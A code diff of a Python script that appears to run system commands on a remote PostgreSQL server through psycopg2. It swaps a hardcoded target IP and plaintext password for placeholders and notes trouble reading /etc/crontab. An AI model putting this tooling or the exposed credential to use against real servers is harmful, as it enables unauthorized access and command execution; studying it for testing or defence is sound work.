@@ -1,12 +1,16 @@
+"""
+A lot of this code was grabbed from a Stack Overflow answer from deszo
+https://dba.stackexchange.com/questions/128229/execute-system-commands-in-postgresql
+"""
+
 import psycopg2
 import sys
 
-
-rhost = "192.168.211.108"
-rport = 5432
-user = "postgres"
-password = "PolicyWielderCandle120"
-database = "splodge"
+rhost = "" #Remote IP Address
+rport = 5432 #Remote Port
+user = "postgres" #Postgres User
+password = "" #Postgres Password
+database = "postgres" #Database (Default: postgres)
 
 conn = psycopg2.connect(
     host=rhost,
@@ -72,6 +76,7 @@ def psql_exec(cur, cmd):
         except psycopg2.errors.InFailedSqlTransaction:
             cur.execute("ROLLBACK")
     except psycopg2.errors.BadCopyFileFormat:
+        #Files such as /etc/crontab screw up the shell. Don't know why it happens, maybe bad characters that need to be escaped
         print("TODO: Execute the command piped into base64, then base64 decode")
         cur.execute("ROLLBACK")
 
